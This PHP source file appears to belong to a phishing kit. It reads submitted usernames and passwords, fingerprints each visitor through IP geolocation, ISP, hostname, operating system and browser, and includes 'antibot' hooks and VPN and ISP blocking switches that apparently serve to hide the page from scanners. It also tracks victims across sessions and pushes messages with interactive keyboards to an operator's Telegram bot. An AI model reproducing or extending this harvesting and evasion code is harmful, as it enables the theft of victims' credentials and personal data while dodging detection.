<?php

function getTimeZoneFromIpAddress() {
    $ip = get_client_ip();
    
    // Get IP details from geoplugin
    $details = get_ip1($ip);
    $details = json_decode($details, true);
    
    if (isset($details['geoplugin_latitude']) && isset($details['geoplugin_longitude']) && 
        is_numeric($details['geoplugin_latitude']) && is_numeric($details['geoplugin_longitude'])) {
        $lat = (float)$details['geoplugin_latitude'];
        $lng = (float)$details['geoplugin_longitude'];
        $country_code = isset($details['geoplugin_countryCode']) ? $details['geoplugin_countryCode'] : '';
        
        $timezone = get_nearest_timezone($lat, $lng, $country_code);
        return array($timezone, $lat, $lng);
    }
    
    // Fallback to extreme-ip-lookup
    $details2 = get_ip2($ip);
    $details2 = json_decode($details2, true);
    
    if (isset($details2['lat']) && isset($details2['lon']) && 
        is_numeric($details2['lat']) && is_numeric($details2['lon'])) {
        $lat = (float)$details2['lat'];
        $lng = (float)$details2['lon'];
        $country_code = isset($details2['countryCode']) ? $details2['countryCode'] : '';
        
        $timezone = get_nearest_timezone($lat, $lng, $country_code);
        return array($timezone, $lat, $lng);
    }
    
    // Default fallback
    return array('UTC', 0, 0);
}

// Initial timezone detection will be moved below function definitions

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED']) && !empty($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR']) && !empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED']) && !empty($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = '127.0.0.1';
    }

    // Handle comma-separated lists
    if (strpos($ipaddress, ',') !== false) {
        $parts = explode(',', $ipaddress);
        $ipaddress = trim($parts[0]);
    }

    return $ipaddress;
}

function is_localhost($ip = null) {
    global $settings;
    // 1. Check for debug mode FIRST - if enabled, we treat EVERYTHING as localhost/safe
    // Check multiple sources for settings for maximum robustness
    $check_settings = null;
    if (isset($GLOBALS['settings']) && is_array($GLOBALS['settings'])) {
        $check_settings = $GLOBALS['settings'];
    } elseif (isset($settings) && is_array($settings)) {
        $check_settings = $settings;
    }

    // Check if debug_mode is explicitly true in any way
    if (is_array($check_settings) && isset($check_settings['debug_mode'])) {
        $dm = $check_settings['debug_mode'];
        if ($dm === true || $dm === "1" || $dm === 1 || $dm === "true" || $dm === "on") {
            return true;
        }
    }
    
    // 2. Fallback: Check config.php directly if settings not available in globals
    // Use __DIR__ to find config.php relative to session/function.php
    $config_candidates = [
        dirname(__DIR__) . DIRECTORY_SEPARATOR . 'config.php',
        __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'config.php',
        $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'config.php'
    ];

    foreach ($config_candidates as $config_path) {
        if (@file_exists($config_path)) {
            $temp_settings = @include($config_path);
            if (is_array($temp_settings) && isset($temp_settings['debug_mode'])) {
                $dm = $temp_settings['debug_mode'];
                if ($dm === true || $dm === "1" || $dm === 1 || $dm === "true" || $dm === "on") {
                    return true;
                }
            }
        }
    }

    // 3. Finally check IP addresses
    if ($ip === null) $ip = get_client_ip();
    $local_ips = ['127.0.0.1', '::1'];
    $is_local = in_array($ip, $local_ips) || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0 || strpos($ip, '172.') === 0;
    
    return $is_local;
}

function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    // Validate input parameters
    if (!is_numeric($cur_lat) || !is_numeric($cur_long)) {
        return 'UTC';
    }
    
    $cur_lat = (float)$cur_lat;
    $cur_long = (float)$cur_long;
    
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                try {
                    $timezone = new DateTimeZone($timezone_id);
                    $location = $timezone->getLocation();
                    $tz_lat   = $location['latitude'];
                    $tz_long  = $location['longitude'];

                    $theta    = $cur_long - $tz_long;
                    $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                        + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                    $distance = acos($distance);
                    $distance = abs(rad2deg($distance));
                    // echo '<br />'.$timezone_id.' '.$distance;

                    if (!$time_zone || $tz_distance > $distance) {
                        $time_zone   = $timezone_id;
                        $tz_distance = $distance;
                    }
                } catch (Exception $e) {
                    // Skip invalid timezone
                    continue;
                }

            }
        }
        return $time_zone;
    }
    return 'UTC';
}

$IP = get_client_ip();

// Respect debug_mode for global $is_localhost variable
$is_localhost = is_localhost($IP);

// Now that $is_localhost is defined, we can safely get the timezone
$array = getTimeZoneFromIpAddress();

function get_ip1($ip2) {
    global $is_localhost;
    if ($is_localhost) return json_encode(['geoplugin_countryName' => 'Localhost', 'geoplugin_city' => 'Testing']);
    
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    global $is_localhost;
    if ($is_localhost) return json_encode(['country' => 'Localhost', 'city' => 'Testing']);
    
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function ISP($ip){
    global $is_localhost;
    if ($is_localhost) return "Localhost Testing";
    
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/'.$ip.'');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: ar,en-US;q=0.9,en;q=0.8,de;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	$js = json_decode($result,TRUE);
	$isp = isset($js['isp']) ? $js['isp'] : 'Unknown ISP';
	return $isp;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}




# Variable Section

$details = get_ip1($IP);
$details = json_decode($details, true);

// Initialize variables with default values
$countryname = "";
$countrycode = "";
$continent = "";
$city = "";
$currency = "";
$regioncity = "";
$ipv6 = "";

// Extract data from first API
if (isset($details['geoplugin_countryName'])) {
    $countryname = $details['geoplugin_countryName'];
    $countrycode = $details['geoplugin_countryCode'] ?? "";
    $continent = $details['geoplugin_continentName'] ?? "";
    $city = $details['geoplugin_city'] ?? "";
    $currency = $details['geoplugin_currencyCode'] ?? "";
}

// Fallback to second API if first one didn't provide data
if($countryname == "") {
    $details2 = get_ip2($IP);
    $details2 = json_decode($details2, true);
    if (isset($details2['country'])) {
        $countryname = $details2['country'];
        $countrycode = $details2['countryCode'] ?? "";
        $continent = $details2['continent'] ?? "";
        $city = $details2['city'] ?? "";
    }
}

$username = isset($_POST['user']) ? $_POST['user'] : "";
$password = isset($_POST['password']) ? $_POST['password'] : "";
$hostname = (filter_var($IP, FILTER_VALIDATE_IP)) ? gethostbyaddr($IP) : 'Unknown';
if ($ipv6 == ""){
  $IPV6 = "N/A";
} else {
  $IPV6 = $ipv6;
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$os = getOS($useragent);
$browser = getBrowser($useragent);

// Add missing variables for antibot compatibility
$ip = $IP; // Make $ip available for antibot files
$dp = strtolower($useragent); // User agent in lowercase for AntiBotThree.php

// Block settings - set to "on" to enable blocking, "off" to disable
$block_vpn = "off";    // Enable VPN blocking
$block_isp = "off";    // Enable ISP blocking  
$block_host = "off";   // Enable hostname blocking
$block_ua = "off";     // Enable user agent blocking

// Function to get IP address (for compatibility with antibot files)
function getIP() {
    return get_client_ip();
}

// Alias for getIP (case-insensitive)
if (!function_exists('getIp')) {
    function getIp() {
        return get_client_ip();
    }
}

/**
 * Get the correct path to redirects.json file (cross-platform)
 * @return string|null Path to redirects.json or null if not found
 */
function get_redirects_file_path() {
    // Try multiple path resolutions for cross-platform compatibility
    $possible_paths = [
        __DIR__ . DIRECTORY_SEPARATOR . 'redirects.json',  // session/redirects.json (when called from session/function.php)
        dirname(__DIR__) . DIRECTORY_SEPARATOR . 'session' . DIRECTORY_SEPARATOR . 'redirects.json',  // From root
        __DIR__ . '/redirects.json',  // Unix style
        dirname(__DIR__) . '/session/redirects.json',  // Unix style from root
    ];
    
    foreach ($possible_paths as $path) {
        $normalized_path = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
        if (file_exists($normalized_path) && is_readable($normalized_path)) {
            return $normalized_path;
        }
    }
    
    return null;
}

/**
 * Restore username from redirects.json if it exists
 * This ensures that if a session is lost or if the admin redirects the user,
 * the username and visitor information can be recovered from the persistent database.
 */
function restore_username_from_redirects() {
    if (!isset($_COOKIE['visitor_key'])) return;

    require_once(__DIR__ . DIRECTORY_SEPARATOR . 'database.php');
    $visitor_data = db_get_visitor_by_key($_COOKIE['visitor_key']);
    
    if ($visitor_data) {
        // Restore session variables
        if (!isset($_SESSION['visitor_id']) || empty($_SESSION['visitor_id'])) {
            $_SESSION['visitor_id'] = $visitor_data['id'];
        }
        
        if (isset($visitor_data['username']) && !empty($visitor_data['username'])) {
            if (!isset($_SESSION['username']) || empty($_SESSION['username'])) {
                $_SESSION['username'] = $visitor_data['username'];
            }
        }
    }
}
/**
 * Send a notification to Telegram with support for inline keyboards
 * @param string $message The message text (HTML)
 * @param array|null $keyboard Optional inline keyboard array
 * @return mixed The CURL result
 */
function send_telegram($message, $keyboard = null) {
    global $settings;
    if (!isset($settings)) { $settings = $GLOBALS['settings']; }
    
    if (!isset($settings['telegram']) || $settings['telegram'] != "1") return false;
    if (empty($settings['bot_url']) || empty($settings['chat_id'])) return false;

    $url = "https://api.telegram.org/bot" . $settings['bot_url'] . "/sendMessage";
    
    // Core payload
    $fields = [
        'chat_id' => $settings['chat_id'],
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    // Try sending with keyboard if provided
    if ($keyboard) {
        $fields_with_kb = $fields;
        $fields_with_kb['reply_markup'] = json_encode($keyboard);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields_with_kb));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        
        // If it worked, return the result
        $res_arr = json_decode($result, true);
        if ($res_arr && isset($res_arr['ok']) && $res_arr['ok'] === true) {
            return $result;
        }
    }

    // Fallback: Send without keyboard if no keyboard provided or if it failed
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}
?>
